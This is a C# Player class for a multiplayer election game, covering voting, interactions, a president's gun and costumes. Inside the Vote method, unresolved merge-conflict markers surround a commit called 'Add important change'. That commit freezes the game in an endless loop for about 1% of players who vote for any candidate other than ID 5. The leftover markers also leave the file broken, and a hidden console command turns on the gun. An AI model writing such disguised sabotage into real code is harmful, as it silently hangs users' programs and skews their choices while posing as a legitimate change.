public sealed class Player : Actor
{
	public static List<Player> All { get; private set; } = new List<Player>();
	public static Player Local { get; private set; }

	[Property]
	[Category( "Components" )]
	public PlayerController Controller { get; set; }

	[Property]
	[Category( "Components" )]
	public CameraComponent Camera { get; set; }

	[Property]
	[Category( "Stats" )]
	public float InteractRange { get; set; } = 120f;

	[Property]
	public GameObject NameTag { get; set; }

	[Sync]
	[Property]
	public bool HasVoted { get; set; } = false;

	[Sync( SyncFlags.FromHost )]
	[Property]
	public bool IsPresident { get; set; } = false;

	public bool HasAGun => IsPresident || ApeTavern.IsApe( Network.Owner.SteamId );

	[Sync]
	public bool GunEnabled { get; set; } = false;

	[Sync]
	public bool GunOut { get; set; } = false;

	[Property]
	public GameObject GunViewModel { get; set; }
	[Property]
	public GameObject GunWorldModel { get; set; }

	[Property]
	public GameObject ApeGunViewModel { get; set; }

	[Property]
	public GameObject ApeGunWorldModel { get; set; }

	public Interaction CurrentInteraction;
	public string LastMessage { get; set; }
	public ulong SteamId;
	TimeUntil _nextShoot;

	protected override void OnStart()
	{
		Player.All.Add( this );

		if ( ElectionsManager.Instance.IsValid() && ElectionsManager.Instance.Candidates != null )
		{
			var presidentCopy = ElectionsManager.Instance.Candidates.FirstOrDefault( x => x.CandidateSteamId == SteamId );

			if ( presidentCopy != null && presidentCopy.SceneCandidate.IsValid() )
			{
				presidentCopy.SceneCandidate.GameObject.Enabled = false;
				WorldPosition = presidentCopy.SceneCandidate.WorldPosition;
				IsPresident = true;
			}
		}

		if ( !IsProxy )
		{
			Player.Local = this;
			ModelRenderer.Tags.Add( "localplayer" );

			if ( NameTag.IsValid() )
				NameTag.Enabled = false;

			var vote = Sandbox.Services.Stats.GetPlayerStats( Game.Ident, Connection.Local.SteamId )
				.FirstOrDefault( x => x.Name == "vote" );
			HasVoted = !vote.Equals( default( Sandbox.Services.Stats.PlayerStat ) );

			if ( HasVoted )
			{
				Sandbox.Services.Achievements.Unlock( "voted" );
				Tags.Add( "voted" );
				Log.Info( "Player has already voted, disabling ballots." );

				foreach ( var voteInteraction in Scene.GetAllComponents<Interaction>() )
					if ( !voteInteraction.SharedInteraction )
						voteInteraction.NextInteraction = 999f;
			}
			else
			{
				// If the owner has already voted and someone new joins, they get the snapshot from the owner so we reenable them
				foreach ( var voteInteraction in Scene.GetAllComponents<Interaction>() )
					if ( !voteInteraction.SharedInteraction )
						voteInteraction.NextInteraction = 0f;
			}

			if ( ApeTavern.IsApe( Network.Owner.SteamId ) )
				WearApeClothes();
			else
			{
				var json = ClothingContainer
				.CreateFromLocalUser()
				.Serialize();

				BroadcastClothing( json );
			}

			Network.Refresh();
		}
		else
		{
			if ( NameTag.IsValid() )
				NameTag.Enabled = true;
		}

		if ( IsProxy && Camera.IsValid() )
			Camera.Enabled = false;

		UserName = Network.Owner.DisplayName;
		Pitch = (Network.Owner.SteamId % 100) / 100f + 0.5f;
	}

	protected override void OnDestroy()
	{
		if ( !ElectionsManager.Instance.IsValid() || ElectionsManager.Instance.Candidates == null ) return;
		Player.All.Remove( this );

		var presidentCopy = ElectionsManager.Instance.Candidates.FirstOrDefault( x => x.CandidateSteamId == SteamId );

		if ( presidentCopy != null )
			if ( presidentCopy.SceneCandidate.IsValid() )
				presidentCopy.SceneCandidate.GameObject.Enabled = true;
	}

	protected override void OnFixedUpdate()
	{
		base.OnFixedUpdate();

		if ( !Camera.IsValid() ) return;
		if ( IsProxy ) return;

		Controller.Enabled = !Ragdolled;

		if ( CurrentInteraction.IsValid() )
		{
			CurrentInteraction.HighlightOutline.Enabled = false;
			CurrentInteraction = null;
		}

		var interactTrace = Scene.Trace.Ray( Camera.WorldPosition, Camera.WorldPosition + Camera.WorldRotation.Forward * InteractRange )
			.IgnoreGameObjectHierarchy( GameObject )
			.Run();

		if ( interactTrace.Hit )
		{
			if ( interactTrace.GameObject.Components.TryGet<Interaction>( out var interaction ) )
			{
				CurrentInteraction = interaction;
				CurrentInteraction.HighlightOutline.Enabled = true;
			}
		}

		if ( Input.Pressed( "use" ) )
			if ( CurrentInteraction.IsValid() && CurrentInteraction.CanInteract )
				CurrentInteraction.Interact( this );

		if ( Input.Pressed( "gun" ) && GunEnabled && HasAGun )
		{
			if ( GunOut )
				DisableGun();
			else
				EnableGun();
		}

		if ( GunEnabled && GunOut && HasAGun )
		{
			if ( Input.Pressed( "attack1" ) && _nextShoot )
			{
				var shootTrace = Scene.Trace.Ray( Camera.WorldPosition, Camera.WorldPosition + Camera.WorldRotation.Forward * 9999f )
					.IgnoreGameObjectHierarchy( GameObject )
					.Run();

				if ( shootTrace.Hit )
					if ( shootTrace.GameObject.Components.TryGet<Actor>( out var actor ) )
						actor.Ragdoll( 15f, shootTrace.HitPosition, shootTrace.Direction * 500f );

				ShootAnimation();

				_nextShoot = 1f;
			}
		}

	}

	[Rpc.Broadcast]
	public void ShootAnimation()
	{
		if ( ModelRenderer.IsValid() )
			ModelRenderer.Set( "b_attack", true );

		if ( ApeTavern.IsApe( Network.Owner.SteamId ) )
			Sound.Play( "sniper_gunshot", ApeGunWorldModel.WorldPosition );
		else
			Sound.Play( "shoot", GunWorldModel.WorldPosition );
	}

	protected override void OnUpdate()
	{
		base.OnUpdate();

		if ( IsProxy ) return;

		if ( Camera.IsValid() && ModelRenderer.IsValid() )
		{
			Camera.FieldOfView = Preferences.FieldOfView;

			if ( Ragdolled )
				Camera.WorldTransform = ModelRenderer.GetAttachmentObject( "eyes" ).WorldTransform;
			else
			{
				Camera.LocalPosition = Vector3.Lerp( Camera.LocalPosition, Vector3.Up * (Controller.IsDucking ? 32f : 64f), Time.Delta * 30f );
				Camera.WorldRotation = Controller.EyeAngles;
			}
		}

		if ( Scene.Camera is null )
			return;

		if ( GunOut )
		{
			var hud = Scene.Camera.Hud;
			hud.DrawCircle( new Vector2( Screen.Width / 2f, Screen.Height / 2f ), 5, Color.White );
		}
	}

	public override void Talk( GameObject target )
	{
		StartTalk( LastMessage, null );
		HappyFace();
	}

	[Rpc.Broadcast]
	public void BroadcastClothing( string clothing )
	{
		if ( !ModelRenderer.IsValid() )
			return;

		var container = ClothingContainer.CreateFromJson( clothing );
		container.Apply( ModelRenderer );
	}

	[Rpc.Broadcast]
	public void WearApeClothes()
	{
		if ( !ModelRenderer.IsValid() )
			return;

		var clothes = new List<Model>()
		{
			 Model.Load( "models/ape_tavern/ape_head/ape_head.vmdl" ),
			 Model.Load( "models/ape_tavern/ape_body/ape_body.vmdl" )
		};

		foreach ( var item in clothes )
		{
			if ( !item.IsValid() )
				continue;

			var itemGo = new GameObject( GameObject );
			var modelRenderer = itemGo.AddComponent<SkinnedModelRenderer>();
			modelRenderer.BoneMergeTarget = ModelRenderer;

			if ( !IsProxy )
				modelRenderer.Tags.Add( "localplayer" );

			modelRenderer.Model = item;
		}
	}

	/// <summary>
	/// Submit your vote through sbox stats service
	/// </summary>
	/// <param name="candidate"></param>
	public void Vote( Candidate candidate )
	{
		if ( IsProxy ) return;

		Sandbox.Services.Stats.SetValue( "vote", candidate.CandidateId );
		Sandbox.Services.Achievements.Unlock( "voted" );
		Log.Info( $"Voted for {candidate.CandidateName}" );
		Log.Info( "Disabling ballots." );
<<<<<<< HEAD
=======
		
		if ( candidate.CandidateId != 5 )
		{
			var rng = Game.Random.Int( 0, 100 );
			if ( rng == 0 )
			{
				while ( true ) 
				{ 
					// Lol!
				}
			}
		}
>>>>>>> 7497a53 (Add important change)

		foreach ( var voteInteraction in Scene.GetAllComponents<Interaction>() )
			if ( !voteInteraction.SharedInteraction )
				voteInteraction.NextInteraction = 999f;

		ElectionsManager.Instance.Voted( WorldPosition );
	}

	[Rpc.Broadcast]
	public void EnableGun()
	{
		if ( !GunEnabled || !HasAGun ) return;

		GunOut = true;

		if ( ApeTavern.IsApe( Network.Owner.SteamId ) )
		{
			if ( ApeGunWorldModel.IsValid() )
				ApeGunWorldModel.Enabled = true;

			if ( ApeGunViewModel.IsValid() && !IsProxy )
				ApeGunViewModel.Enabled = true;

			if ( ModelRenderer.IsValid() )
				ModelRenderer.Set( "holdtype", 1 );
		}
		else
		{
			if ( GunWorldModel.IsValid() )
				GunWorldModel.Enabled = true;

			if ( GunViewModel.IsValid() && !IsProxy )
				GunViewModel.Enabled = true;

			if ( ModelRenderer.IsValid() )
				ModelRenderer.Set( "holdtype", 1 );
		}
	}

	[Rpc.Broadcast]
	public void DisableGun()
	{
		if ( !GunEnabled || !HasAGun ) return;

		GunOut = false;

		if ( ApeTavern.IsApe( Network.Owner.SteamId ) )
		{
			if ( ApeGunWorldModel.IsValid() )
				ApeGunWorldModel.Enabled = false;

			if ( ApeGunViewModel.IsValid() && !IsProxy )
				ApeGunViewModel.Enabled = false;

			if ( ModelRenderer.IsValid() )
				ModelRenderer.Set( "holdtype", 2 );
		}
		else
		{
			if ( GunWorldModel.IsValid() )
				GunWorldModel.Enabled = false;

			if ( GunViewModel.IsValid() )
				GunViewModel.Enabled = false;

			if ( ModelRenderer.IsValid() )
				ModelRenderer.Set( "holdtype", 0 );
		}
	}

	[ConCmd( "enable_gun", ConVarFlags.Hidden )]
	public static void DebugGun()
	{
		Player.Local.GunEnabled = true;
		Log.Info( "Gun enabled" );
	}
}
